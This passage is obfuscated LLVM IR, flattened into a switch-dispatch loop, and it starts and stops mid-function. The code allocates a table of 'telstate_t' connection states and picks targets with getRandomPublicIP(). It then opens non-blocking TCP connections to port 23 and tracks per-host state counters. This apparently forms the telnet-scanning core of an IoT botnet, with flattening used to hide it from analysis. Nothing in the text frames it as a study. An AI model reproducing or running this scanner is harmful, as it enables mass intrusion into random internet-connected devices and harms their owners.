    i32 -73838993, label %565
    i32 -1968577160, label %566
    i32 1080833952, label %567
    i32 -1637451625, label %577
    i32 -2119976115, label %592
    i32 698225607, label %593
    i32 -1582709377, label %619
    i32 1301022082, label %634
    i32 -1432798926, label %643
    i32 -1755587484, label %658
    i32 -1670736186, label %663
    i32 1547159676, label %671
    i32 262431857, label %677
    i32 -1058048520, label %686
    i32 -1557753996, label %691
    i32 -506267731, label %711
    i32 -1961239799, label %728
    i32 508657302, label %733
    i32 -416363427, label %738
    i32 -1636232823, label %744
    i32 709050309, label %753
    i32 1765276205, label %768
    i32 -938795484, label %780
    i32 1642117522, label %790
    i32 -459477982, label %805
    i32 1734169835, label %806
    i32 1928654475, label %832
    i32 -1948743404, label %847
    i32 -1627989078, label %856
    i32 -469779736, label %871
    i32 1108330736, label %876
    i32 -413769202, label %884
    i32 -1465819135, label %890
    i32 1032607763, label %910
    i32 225135487, label %927
    i32 1268379664, label %947
    i32 -450077101, label %956
    i32 1942933202, label %976
    i32 1434626114, label %981
    i32 -1122260232, label %987
    i32 1150423916, label %999
    i32 -201578286, label %1009
    i32 -480791700, label %1024
    i32 125945193, label %1025
    i32 -255794742, label %1034
    i32 1839634055, label %1049
    i32 -1511795830, label %1054
    i32 -820918432, label %1062
    i32 -1658027898, label %1068
    i32 -938739543, label %1080
    i32 767033480, label %1100
    i32 717831329, label %1110
    i32 -2074077644, label %1125
    i32 890855189, label %NewDefault
    i32 1852927977, label %1126
    i32 -789462687, label %1127
    i32 1504449285, label %1130
    i32 -1755908673, label %1131
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 512
  %19 = select i1 %18, i32 -1807421543, i32 1855028908
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 220879936, i32* %switchVar
  store i32 512, i32* %.reg2mem198
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i32, i32* %1, align 4
  store i32 220879936, i32* %switchVar
  store i32 %22, i32* %.reg2mem198
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %.reload199 = load i32, i32* %.reg2mem198
  store i32 %.reload199, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  store %struct.telstate_t* %32, %struct.telstate_t** %.reg2mem18
  %.reload186 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %33 = bitcast %struct.telstate_t* %.reload186 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  store i32 -535778866, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  %41 = select i1 %40, i32 32326147, i32 -1843151572
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %.reload185 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload185, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 1024) #2
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %.reload184 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload184, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %.reload183 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload183, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 1024, i32 1, i1 false)
  store i32 859522911, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  store i32 -535778866, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %62, align 8
  store i32 1241689673, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 1085415777, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -792476572, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  %69 = select i1 %68, i32 1187074125, i32 1504449285
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %.reload182 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload182, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  store i32 %76, i32* %.reg2mem187
  store i32 -1344646409, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload197 = load volatile i32, i32* %.reg2mem187
  %Pivot16 = icmp slt i32 %.reload197, 4
  %77 = select i1 %Pivot16, i32 -2137063087, i32 -704743800
  store i32 %77, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload192 = load volatile i32, i32* %.reg2mem187
  %Pivot14 = icmp slt i32 %.reload192, 6
  %78 = select i1 %Pivot14, i32 546622512, i32 -1336567611
  store i32 %78, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload190 = load volatile i32, i32* %.reg2mem187
  %Pivot12 = icmp slt i32 %.reload190, 7
  %79 = select i1 %Pivot12, i32 1108330736, i32 -1136098647
  store i32 %79, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload189 = load volatile i32, i32* %.reg2mem187
  %Pivot10 = icmp slt i32 %.reload189, 8
  %80 = select i1 %Pivot10, i32 125945193, i32 38212982
  store i32 %80, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload188 = load volatile i32, i32* %.reg2mem187
  %SwitchLeaf8 = icmp eq i32 %.reload188, 8
  %81 = select i1 %SwitchLeaf8, i32 -1511795830, i32 890855189
  store i32 %81, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload191 = load volatile i32, i32* %.reg2mem187
  %Pivot6 = icmp slt i32 %.reload191, 5
  %82 = select i1 %Pivot6, i32 -1670736186, i32 1734169835
  store i32 %82, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload196 = load volatile i32, i32* %.reg2mem187
  %Pivot4 = icmp slt i32 %.reload196, 2
  %83 = select i1 %Pivot4, i32 -676331795, i32 -1260903542
  store i32 %83, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload193 = load volatile i32, i32* %.reg2mem187
  %Pivot2 = icmp slt i32 %.reload193, 3
  %84 = select i1 %Pivot2, i32 1676583517, i32 698225607
  store i32 %84, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload195 = load volatile i32, i32* %.reg2mem187
  %Pivot = icmp slt i32 %.reload195, 1
  %85 = select i1 %Pivot, i32 -608059298, i32 462377262
  store i32 %85, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload194 = load volatile i32, i32* %.reg2mem187
  %SwitchLeaf = icmp eq i32 %.reload194, 0
  %86 = select i1 %SwitchLeaf, i32 -1202403022, i32 890855189
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* %2, align 4
  %89 = sext i32 %88 to i64
  %.reload181 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload181, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 8
  %92 = load i8*, i8** %91, align 8
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 1024, i32 1, i1 false)
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %.reload180 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload180, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 3
  %97 = load i8, i8* %96, align 1
  %98 = icmp ne i8 %97, 0
  %99 = select i1 %98, i32 1830475780, i32 -590988738
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32, i32* %2, align 4
  %102 = sext i32 %101 to i64
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload179, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 8
  %105 = load i8*, i8** %104, align 8
  store i8* %105, i8** %11, align 8
  %106 = load i32, i32* %2, align 4
  %107 = sext i32 %106 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %107
  %109 = bitcast %struct.telstate_t* %108 to i8*
  call void @llvm.memset.p0i8.i64(i8* %109, i8 0, i64 32, i32 16, i1 false)
  %110 = load i8*, i8** %11, align 8
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 8
  store i8* %110, i8** %114, align 8
  %115 = call i32 @getRandomPublicIP()
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 1
  store i32 %115, i32* %119, align 4
  store i32 -394520892, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %2, align 4
  %122 = sext i32 %121 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 5
  %125 = load i8, i8* %124, align 1
  %126 = add i8 %125, 1
  store i8 %126, i8* %124, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 5
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i64
  %133 = icmp eq i64 %132, 14
  %134 = select i1 %133, i32 872450545, i32 391096973
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i32, i32* %2, align 4
  %137 = sext i32 %136 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 5
  store i8 0, i8* %139, align 1
  %140 = load i32, i32* %2, align 4
  %141 = sext i32 %140 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 4
  %144 = load i8, i8* %143, align 2
  %145 = add i8 %144, 1
  store i8 %145, i8* %143, align 2
  store i32 391096973, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %2, align 4
  %148 = sext i32 %147 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 4
  %151 = load i8, i8* %150, align 2
  %152 = zext i8 %151 to i64
  %153 = icmp eq i64 %152, 6
  %154 = select i1 %153, i32 426529582, i32 647453051
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32, i32* %2, align 4
  %157 = sext i32 %156 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 3
  store i8 1, i8* %159, align 1
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 -394520892, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %162, align 4
  %163 = call zeroext i16 @htons(i16 zeroext 23) #13
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %163, i16* %164, align 2
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %166 = getelementptr inbounds [8 x i8], [8 x i8]* %165, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %166, i8 0, i64 8, i32 4, i1 false)
  %167 = load i32, i32* %2, align 4
  %168 = sext i32 %167 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %172, i32 0, i32 0
  store i32 %171, i32* %173, align 4
  %174 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %175 = load i32, i32* %2, align 4
  %176 = sext i32 %175 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 0
  store i32 %174, i32* %178, align 16
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 16
  %184 = bitcast %struct.timeval* %10 to i8*
  %185 = call i32 @setsockopt(i32 %183, i32 1, i32 20, i8* %184, i32 16) #2
  %186 = load i32, i32* %2, align 4
  %187 = sext i32 %186 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 16
  %191 = bitcast %struct.timeval* %10 to i8*
  %192 = call i32 @setsockopt(i32 %190, i32 1, i32 21, i8* %191, i32 16) #2
  %193 = load i32, i32* %2, align 4
  %194 = sext i32 %193 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = icmp eq i32 %197, -1
  %199 = select i1 %198, i32 -1829343253, i32 1704989317
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  store i32 -789462687, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32, i32* %2, align 4
  %203 = sext i32 %202 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 16
  %207 = load i32, i32* %2, align 4
  %208 = sext i32 %207 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 16
  %212 = call i32 (i32, i32, ...) @fcntl(i32 %211, i32 3, i8* null)
  %213 = or i32 %212, 2048
  %214 = call i32 (i32, i32, ...) @fcntl(i32 %206, i32 4, i32 %213)
  %215 = load i32, i32* %2, align 4
  %216 = sext i32 %215 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 16
  %220 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %221 = call i32 @connect(i32 %219, %struct.sockaddr* %220, i32 16)
  %222 = icmp eq i32 %221, -1
  %223 = select i1 %222, i32 1125754754, i32 433030083
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = call i32* @__errno_location() #13
  %226 = load i32, i32* %225, align 4
  %227 = icmp ne i32 %226, 115
  %228 = select i1 %227, i32 867074381, i32 433030083
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i32, i32* %2, align 4
  %231 = sext i32 %230 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 0
  %234 = load i32, i32* %233, align 16
  %235 = call i32 @sclose(i32 %234)
  %236 = load i32, i32* %2, align 4
  %237 = sext i32 %236 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 3
  store i8 1, i8* %239, align 1
  store i32 -969346834, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i32, i32* %2, align 4
  %242 = sext i32 %241 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 2
  store i8 1, i8* %244, align 8
  %245 = load i32, i32* %2, align 4
  %246 = sext i32 %245 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 6
  store i32 0, i32* %248, align 4
  store i32 -969346834, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  store i32 1852927977, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %2, align 4
  %252 = sext i32 %251 to i64
  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 6
  %255 = load i32, i32* %254, align 4
  %256 = icmp eq i32 %255, 0
  %257 = select i1 %256, i32 -928021133, i32 253145803
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %260 = load i32, i32* %2, align 4
  %261 = sext i32 %260 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 6
  store i32 %259, i32* %263, align 4
  store i32 253145803, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  store i32 1693787546, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %267 = getelementptr inbounds [16 x i64], [16 x i64]* %266, i64 0, i64 0
  %268 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %267) #2, !srcloc !5
  %269 = extractvalue { i64, i64* } %268, 0
  %270 = extractvalue { i64, i64* } %268, 1
  %271 = trunc i64 %269 to i32
  store i32 %271, i32* %12, align 4
  %272 = ptrtoint i64* %270 to i64
  %273 = trunc i64 %272 to i32
  store i32 %273, i32* %13, align 4
  store i32 478676447, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  store i32 -1383048380, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i32, i32* %2, align 4
  %277 = sext i32 %276 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = srem i32 %280, 64
  %282 = zext i32 %281 to i64
  %283 = shl i64 1, %282
  %284 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %285 = load i32, i32* %2, align 4
  %286 = sext i32 %285 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %286
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 16
  %290 = sdiv i32 %289, 64
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds [16 x i64], [16 x i64]* %284, i64 0, i64 %291
  %293 = load i64, i64* %292, align 8
  %294 = or i64 %293, %283
  store i64 %294, i64* %292, align 8
  %295 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %295, align 8
  %296 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %296, align 8
  %297 = load i32, i32* %2, align 4
  %298 = sext i32 %297 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 0
  %301 = load i32, i32* %300, align 16
  %302 = add nsw i32 %301, 1
  %303 = call i32 @select(i32 %302, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %303, i32* %3, align 4
  %304 = load i32, i32* %3, align 4
  %305 = icmp eq i32 %304, 1
  %306 = select i1 %305, i32 -1906514726, i32 -2058469914
  store i32 %306, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %308 = load i32, i32* %2, align 4
  %309 = sext i32 %308 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = bitcast i32* %7 to i8*
  %314 = call i32 @getsockopt(i32 %312, i32 1, i32 4, i8* %313, i32* %6) #2
  %315 = load i32, i32* %7, align 4
  %316 = icmp ne i32 %315, 0
  %317 = select i1 %316, i32 -587372681, i32 1767587359
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = call i32 @sclose(i32 %323)
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 2
  store i8 0, i8* %328, align 8
  %329 = load i32, i32* %2, align 4
  %330 = sext i32 %329 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 3
  store i8 1, i8* %332, align 1
  store i32 -885995345, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i32, i32* %2, align 4
  %335 = sext i32 %334 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 0
  %338 = load i32, i32* %337, align 16
  %339 = load i32, i32* %2, align 4
  %340 = sext i32 %339 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %340
